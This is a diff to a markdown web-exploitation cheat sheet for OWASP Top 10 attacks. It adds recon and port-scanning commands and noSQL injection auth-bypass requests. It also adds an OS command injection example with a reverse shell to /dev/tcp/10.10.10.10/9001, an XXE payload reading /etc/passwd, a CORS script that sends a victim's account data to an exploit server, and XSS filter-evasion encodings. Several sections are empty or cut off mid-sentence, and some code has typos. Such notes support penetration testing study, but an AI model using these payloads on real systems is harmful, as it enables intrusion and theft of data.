@@ -4,7 +4,6 @@ This is a cheat sheet for exploitation of OWASP Top 10.
 
 It is the followed by more refined attacks. 
 
-
 ## recon
 
 ### Domain intel
@@ -25,30 +24,80 @@ amass enum -active -d $domain -brute -w $sub_domains -o $domain.recon.log -timeo
 
 docker run -v $(pwd):/home/rustscan/  -it --rm --name rustscan rustscan/rustscan:latest --top -a /home/rustscan/targets.txt -b 1000
 
-subfinder -d example.com | $HOME/go/bin/httpx | tee urls.txt
+subfinder -d example.com | tee subdomains.txt
 
-gowitness file -f urls.txt
+gowitness scan file -f subdomains.txt --threads 100 --write-db
 
-gowitness server --address 0.0.0.0:7171
+gowitness report server 127.0.0.1:7171
 
 nuclei -list urls.txt
 
 
 ```
+## Other service recon
+
+```bash
+
+#This gives list of ip of resolved domains
+
+dnsx -l subdomains.txt -a -silent -ro | sort -u | while read -r ip; do echo "$ip $(dig +short A $ip 2>/dev/null"; done > resolved-ips.txt
+```
+
+```bash
+#prepare output for masscan
+
+cat resolved-ips.txt | tr '\n' ',' | sed 's/ //g'  > masscan-ips.txt 
+```
+
+```bash
+#Scan for ports
+
+masscan -p$(cat ~/Tools/recon/top1000-ports.txt) --rate=1000 --banners $(cat masscan-ips.txt) -oG ports-grep.txt  | tee port-scan.txt
+```
+
+```bash
+#make list ip port
+cat masscan-ports.txt | grep -vE '^#' | awk '{print $4, $7}' | sed 's/\/open.*$//' | tr ' ' ':'  |  sort -u > resolved-ports.txt
+```
+
+```bash
+#scan each port with nmap
+ while IFS=':' read -r IP port; do nmap -p "$port" -T3 -n -Pn  -sCV "$IP" >> nmap-scan.txt; done < resolved-ports.txt
+```
+
+## Dirbust
+
+
+```bash
+dirsearch -u https://example.com -o m-n1-dirb.txt --crawl --user-agent='Mozilla/5.0' -t 60 -i 200,300-399 -r -f -e html,php,asp,aspx
+```
 
 ## Download site copy
 
-This ia gonna loot a `/folder` 
+loots a `/folder` content
 
 ```bash
 wget -r -np -R "index.html*" https://target.to.loot/folder/
 ```
 
+## Exploitation methodology
+
+Basically, there are many web related cyber attacks. But all of them can be put into those few categories based on the type of payload triggering:
+
+* injections: Command injection, XXS, XXE ...
+* backend logic manipulation: access control bypass (reaching API endpoint which is not supposed to be reached), race condition, CSRF
+* cryptography defeat: inherent 
+
+### Injections
+
+It used to be the most common 
+
+
+
 ## SAML
 ## OAuth
 ## JWT
-## Vertical access control
-## Horizontal access control
+## ACL
 ## SQLi
 
 ### time based
@@ -68,15 +117,205 @@ wget -r -np -R "index.html*" https://target.to.loot/folder/
 
 ```
 
+## noSQLi
 
-## OS
+No SQL injection occurs in non-relational databases such MongoDB, REDIS and others. These data bases work with paradigms containing full logical operators, json and specific query syntax no like SQL and much more advanced.
+So basically to target noSQL DB it is needed to identify underlying technology. However. the workflow is much alike SQL.
+
+1. Detect the injection point.
+
+```bash
+
+# fuzz to detect abnormal response
+ffuf -w https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401
+
+```
+As always check PayloadsAllTheThings and PortSwigger. In case of WAF use double encoding, capitalization and other obfuscation measures.
+
+Some quick n dirty strings
+
+```text
+'"`{
+;$Foo}
+$Foo \xYZ
+```
+
+Oneliner
+
+```
+'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
+```
+
+Dont forget to URL encode this stuff (Ctrl + U in Burp).
+
+Additionally, it is good to confirm the injection point using some kind of `sleep()` function. Like `sleep(5000)` would cause MongoDB query to wait 5 seconds.
+
+2. Then determine which characters cause trouble and try narrowing down how to manipulate them into not producing an error. 
+
+```http
+
+#produces error
+/?filter='
+
+#no error
+/?filter='\''
+
+```
+
+3. Inject logic into the queries to monitor what causes true and false conditions:
+
+```http
+
+# dont forget to URL encode!
+
+# error
+/?filter=' && 0 && ' 
+
+# no error?
+/?filter=' || 0 || ' 
+
+# retrieve everytrhing!
+/?filter=' || 1 || ' 
+
+```
+
+Also works sometimes to inject nullbytes to force the DB to ignore any subsequent characters:
+
+```http
+
+/?filter=' || 1 %00
+
+```
+
+4. Inject noSQL query operators:
+
+```text
+
+$ne	    not equal
+$regex	regular expression
+$gt	    greater than
+$lt	    lower than
+$nin	not in
+
+```
+
+5. noSQL expressions can be sent with any types of request. However, GET request does not accept `[]`, so it is needed to probe if the target server accepts POST. In this case, basic auth bypass within the request body can look like this `username[$ne]=xaxaxa&password[$ne]=xaxaxa`. If only json is accepted then convert `Content-Type` from `application/x-www-form-urlencoded` to `application/json` this can be also easily done in Burp with `Content Type Converter`.
+
+Here is a summary of basic auth bypass attack:
+
+```http
+GET /login.php HTTP/1.
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+
+username[$ne]=xaxaxa&password[$ne]=xaxaxa
+```
+
+Using json payload (for MongoDB):
+
+```http
+GET /login.php HTTP/1.
+Host: localhost
+Content-Type: application/json
+
+{
+    "username":{"$ne": "xaxaxa"},
+    "password":{"$ne": "xaxaxa"}
+}
+
+```
+
+6. One of the most useful features is `$where` expression that returns data matching `js` function:
+
+```js
+
+db.family.find({ $where: function() { return (this.name.first == 'admin') } })
+
+```
+
+You can quickly see that it is useful in case some app receives some parameter and uses it as part of `js` function. Attacker can then inject complete `js` expression like it is done here:
+
+```js
+admin' && this.password[0] == 'a' || 'a'=='b
+```
+
+Therefore, simmilar to blind SQL injection attacker can iterate letter by letter through this to get the complete password.
+
+7. So, the `$where` operator is VERY DANGEROUS. It allows executing ANY JavaScript passed to MongoDB.
+
+So either add additional `{$where : 1}` to the POST request or inject somewhere else to check it. IF it executes it means that may be ANY JavaScript can be injected into the DB.
+
+## OS injection
+
+Some backends process user input as part of system commands like in this code snippet:
+
+```python 
+import flask
+import subrocess 
+
+@app.route('/what_is_my_ping')
+def query_example():
+# consider a case in a flask app when user enters IP address in the front end to get the ping from the server
+    user_ip = request.args.get('user_ip_input')
+    command = f"ping -c 1 {user_ip}"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
+
+```
+
+Here you can see the attacker can break out of the program context by entering:
+
+```bash
+#thx to revshells.com
+/what_is_my_ping?8.8.8.8; sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
+
+```
+
+DONT FORGET TO URL encode (Ctrl + U) in Burp the payload.
+
+That would open a liste
+
 ## SSTI
 ## XXE
+
+If XML parser is poorly configured and no user sanitization applied then try forcing LFI:
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+```
+
+
+
 ## XSLT
 ## Deserilization
 ## Race condition
 ## CORS
+
+CORS regulates which websites can access ressources of the current website. So, if the ACAO policy is poorly configured then any website can fetch data from the victim website.
+
+This is BAD because if there is a CSRF or any otyher vulnerability within the resources of the victim site then those can be access with a `js` like the one from portswigger tutorial:
+
+```js
+
+<script>
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://0ac2009304c1c1ac835982d9008a0041.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='https://exploit-0a7500650485c1c5834681ca017500b8.exploit-server.net/exploit/log?key='+this.responseText;
+};
+
+</script>
+
+```
+
 ## XSS
+
+Many WAFs block `alert()`.. so instead of it try using `<script>debugger;</script>` to detect xss injection point.
+
 ## CSRF
 ## CSTI
 ## Encryption
@@ -639,3 +878,39 @@ https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca
 <iframe src="https://example.com" width=100% height=100% style=”opacity: 0.5;”></iframe>
 </body>
 </html>
+
+## Obfuscation using encodings
+
+As example `<img src=1 onerror=alert()>`:
+
+* backticks: `<img src=1 onerror=alert``>`
+* caps: `<img src=1 oNeRRoR=alert()>`
+* URL-encoding:  `%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%29%3e`
+* HTML-entity-encoding: `&lt;img src=1 onerror=alert()&gt;`
+* leading zeroes with dec or hex encoding: `<a href="javascript&#00000000000058;alert(1)">Click me</a>`
+* hex encoding:  `<img src=x onerror="&#x61;lert(1)">`
+* unicode encoding: `<img src=1 onerror=\u0061\u006c\u0065\u0072\u0074()>`
+
+Best results can be achieved by combining all of them.
+
+## Prototype pollution
+
+Alters the prototype of some object in js. If there is unsafe assignment of prototype that can be influenced by injection, then a malicious content can be assigned to the object.
+
+Workflow:
+
+1. Find the source of injection. 
+
+Possible injection methods:
+
+```js
+
+// into URL
+
+/?__proto__[ping]=pong;--
+/?__proto__.ping=pong;--
+
+```
+
+2. Find the sink (js function or DOM element) that can be accessed by the source.
+3. Gadget exploit: a property passed into sink that can be executed.
